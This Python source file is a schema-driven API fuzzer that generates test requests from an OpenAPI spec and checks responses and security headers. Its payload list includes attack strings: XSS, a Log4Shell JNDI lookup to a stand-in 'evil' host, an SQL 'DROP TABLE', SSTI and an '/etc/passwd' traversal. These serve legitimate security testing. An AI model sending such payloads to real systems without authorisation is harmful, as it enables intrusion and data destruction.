# SPDX-License-Identifier: MIT
"""
Schemathesis-style API fuzzer — property-based fuzzing from OpenAPI schema.

Generates test cases that:
1. Send valid requests per schema → verify 2xx response
2. Send boundary/invalid requests → verify proper error handling
3. Check response schema conformance
4. Check security headers (CORS, CSP, HSTS)

Usage:
  python schema_fuzzer.py fuzz --schema openapi.json --base-url http://localhost:8800
  python schema_fuzzer.py validate --schema openapi.json --response response.json --path /users
"""

from __future__ import annotations

import json
import random
import string
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


# ═══════════════════════════════════════════════════════════════
# Fuzz payloads (extended from fuzzer.py)
# ═══════════════════════════════════════════════════════════════

FUZZ_PAYLOADS: dict[str, list[Any]] = {
    "string_boundary": [
        "",                          # empty
        "A" * 10000,                # very long
        "\x00",                     # null byte
        "\n\r\t",                   # whitespace only
        "null", "undefined", "NaN", # JS-like sentinels
        "<script>alert(1)</script>",# XSS
        "${jndi:ldap://evil/}",     # Log4Shell
        "{{7*7}}",                   # SSTI
        "'; DROP TABLE users; --",   # SQL injection
        "../../../etc/passwd",       # Path traversal
        "😀" * 100,                  # Unicode
    ],
    "int_boundary": [
        0, -1, 1,
        2**31 - 1, -(2**31),
        2**63 - 1, -(2**63),
        9999999999999999999999999,  # overflow
        -0, 0.0,                    # zero variants
    ],
    "float_boundary": [
        0.0, -0.0, 1.0, -1.0,
        float("inf"), float("-inf"),
        1.7976931348623157e+308,    # max double
        2.2250738585072014e-308,    # min positive double
    ],
    "array_boundary": [
        [],                          # empty
        [None],                      # null element
        ["x"] * 1000,               # huge
    ],
    "object_boundary": {
        "empty": {},
        "null_value": {"key": None},
        "deep_nesting": {"a": {"b": {"c": {"d": {"e": "deep"}}}}},
        "extra_fields": {"id": 1, "name": "test", "__proto__": "polluted"},
    },
}

SECURITY_HEADERS = {
    "Content-Security-Policy": "recommended",
    "Strict-Transport-Security": "recommended",
    "X-Content-Type-Options": "required",  # must be "nosniff"
    "X-Frame-Options": "recommended",
    "X-XSS-Protection": "deprecated",
}


# ═══════════════════════════════════════════════════════════════
# Schema-based fuzz case generation
# ═══════════════════════════════════════════════════════════════

@dataclass
class FuzzCase:
    """A single fuzz test case."""
    method: str
    path: str
    description: str
    headers: dict[str, str] = field(default_factory=dict)
    body: Any = None
    expected_status: str = "any"  # 2xx | 4xx | any

    def evaluate(self, base_url: str, timeout: int = 30) -> dict[str, Any]:
        """Execute the fuzz case against a live API."""
        if not HAS_REQUESTS:
            return {"error": "requests library not installed"}

        url = urljoin(base_url, self.path.lstrip("/"))
        start = time.time()
        try:
            if self.method == "GET":
                resp = requests.get(url, headers=self.headers, timeout=timeout)
            elif self.method == "POST":
                resp = requests.post(url, json=self.body, headers=self.headers, timeout=timeout)
            elif self.method == "PUT":
                resp = requests.put(url, json=self.body, headers=self.headers, timeout=timeout)
            elif self.method == "DELETE":
                resp = requests.delete(url, headers=self.headers, timeout=timeout)
            elif self.method == "PATCH":
                resp = requests.patch(url, json=self.body, headers=self.headers, timeout=timeout)
            else:
                return {"error": f"unsupported method: {self.method}"}

            duration = time.time() - start
            return {
                "url": url,
                "method": self.method,
                "status": resp.status_code,
                "duration_ms": round(duration * 1000, 1),
                "headers": dict(resp.headers),
                "body": resp.text[:2000],
                "passed": _check_status(resp.status_code, self.expected_status),
            }
        except requests.ConnectionError as e:
            return {"url": url, "method": self.method, "error": f"connection refused: {e}"}
        except requests.Timeout:
            return {"url": url, "method": self.method, "error": f"timeout after {timeout}s"}
        except Exception as e:
            return {"url": url, "method": self.method, "error": str(e)}


def _check_status(actual: int, expected: str) -> bool:
    if expected == "any":
        return True
    if expected == "2xx":
        return 200 <= actual < 300
    if expected == "4xx":
        return 400 <= actual < 500
    if expected == "5xx":
        return 500 <= actual < 600
    return actual == int(expected) if expected.isdigit() else False


def generate_from_schema(schema: dict[str, Any]) -> list[FuzzCase]:
    """Generate fuzz cases from OpenAPI 3.x schema."""
    cases: list[FuzzCase] = []

    for path, methods in schema.get("paths", {}).items():
        for method, detail in methods.items():
            if method.upper() not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                continue

            # Valid request
            cases.append(_valid_case(path, method.upper(), detail))

            # Invalid request: missing required body
            if detail.get("requestBody", {}).get("required"):
                cases.append(FuzzCase(
                    method=method.upper(), path=path,
                    description=f"{method.upper()} {path} — missing required body",
                    headers={"Content-Type": "application/json"},
                    expected_status="4xx",
                ))

            # Boundary fuzz: wrong content type
            cases.append(FuzzCase(
                method=method.upper(), path=path,
                description=f"{method.upper()} {path} — wrong content-type",
                headers={"Content-Type": "text/plain"},
                body="not json",
                expected_status="4xx",
            ))

            # Parameter fuzzing
            for param in detail.get("parameters", []):
                param_name = param.get("name", "")
                schema_type = param.get("schema", {}).get("type", "string")
                if schema_type == "string":
                    for i, payload in enumerate(FUZZ_PAYLOADS["string_boundary"][:5]):
                        fuzzed_path = path.replace(f"{{{param_name}}}", str(payload))
                        cases.append(FuzzCase(
                            method=method.upper(), path=fuzzed_path,
                            description=f"{method.upper()} {path} — fuzz {param_name}[{i}], {schema_type}",
                            expected_status="4xx",
                        ))

    return cases


def _valid_case(path: str, method: str, detail: dict) -> FuzzCase:
    """Generate a valid fuzz case from OpenAPI operation."""
    headers = {"Content-Type": "application/json"}
    body = None

    if "requestBody" in detail:
        content = detail["requestBody"].get("content", {})
        json_content = content.get("application/json", {})
        example = json_content.get("example")
        if example is None and "schema" in json_content:
            example = _gen_valid_example(json_content["schema"])
        body = example

    return FuzzCase(
        method=method, path=path,
        description=f"{method} {path} — valid request",
        headers=headers, body=body,
        expected_status="2xx",
    )


def _gen_valid_example(schema: dict) -> Any:
    """Generate a valid example from JSON Schema."""
    t = schema.get("type", "object")
    if t == "object":
        props = schema.get("properties", {})
        return {k: _gen_valid_example(v) for k, v in list(props.items())[:5]}
    if t == "array":
        items = schema.get("items", {})
        return [_gen_valid_example(items)]
    if t == "string":
        return schema.get("example", "test")
    if t == "integer":
        return schema.get("example", 42)
    if t == "number":
        return schema.get("example", 3.14)
    if t == "boolean":
        return schema.get("example", True)
    return None


# ═══════════════════════════════════════════════════════════════
# Response validation
# ═══════════════════════════════════════════════════════════════

def validate_response(response_json: dict, schema: dict, path: str, method: str) -> dict[str, Any]:
    """Validate an API response against its OpenAPI schema."""
    method_lower = method.lower()
    path_spec = schema.get("paths", {}).get(path, {})
    op_spec = path_spec.get(method_lower, {})

    issues: list[str] = []
    expected_statuses = list(op_spec.get("responses", {}).keys())
    if expected_statuses:
        issues.append(f"expected status in {expected_statuses}")

    # Check security headers
    missing_headers = []
    for header, level in SECURITY_HEADERS.items():
        if level == "required" and header not in response_json:
            missing_headers.append(header)
    if missing_headers:
        issues.append(f"missing required security headers: {missing_headers}")

    return {
        "path": path,
        "method": method,
        "valid": len(issues) == 0,
        "issues": issues,
    }


# ═══════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="Schema-based API fuzzer")
    sub = ap.add_subparsers(dest="cmd")

    fuzz = sub.add_parser("fuzz", help="Fuzz API from OpenAPI schema")
    fuzz.add_argument("--schema", required=True)
    fuzz.add_argument("--base-url", required=True)
    fuzz.add_argument("--timeout", type=int, default=30)
    fuzz.add_argument("--output", default="")

    gen = sub.add_parser("generate", help="Generate fuzz cases (dry run)")
    gen.add_argument("--schema", required=True)
    gen.add_argument("--output", default="")

    args = ap.parse_args()

    schema = json.loads(Path(args.schema).read_text(encoding="utf-8"))

    if args.cmd == "generate":
        cases = generate_from_schema(schema)
        output = {
            "total_cases": len(cases),
            "cases": [{"method": c.method, "path": c.path, "description": c.description,
                        "expected_status": c.expected_status} for c in cases],
        }
        json_str = json.dumps(output, indent=2, ensure_ascii=False)
        if args.output:
            Path(args.output).write_text(json_str, encoding="utf-8")
        print(json_str)

    elif args.cmd == "fuzz":
        if not HAS_REQUESTS:
            print('{"error": "requests library required: pip install requests"}')
            exit(1)
        cases = generate_from_schema(schema)
        results = []
        passed = 0
        for case in cases:
            r = case.evaluate(args.base_url, args.timeout)
            results.append(r)
            if r.get("passed"):
                passed += 1
            status = r.get("status", "ERR")
            print(f"  {case.method:6} {case.path:30} → {status} {'✓' if r.get('passed') else '✗'}")
        summary = {
            "total": len(results),
            "passed": passed,
            "failed": len(results) - passed,
            "pass_rate": round(passed / max(len(results), 1) * 100, 1),
            "results": results,
        }
        if args.output:
            Path(args.output).write_text(json.dumps(summary, indent=2, ensure_ascii=False), encoding="utf-8")
        print(f"\n{passed}/{len(results)} passed ({summary['pass_rate']}%)")
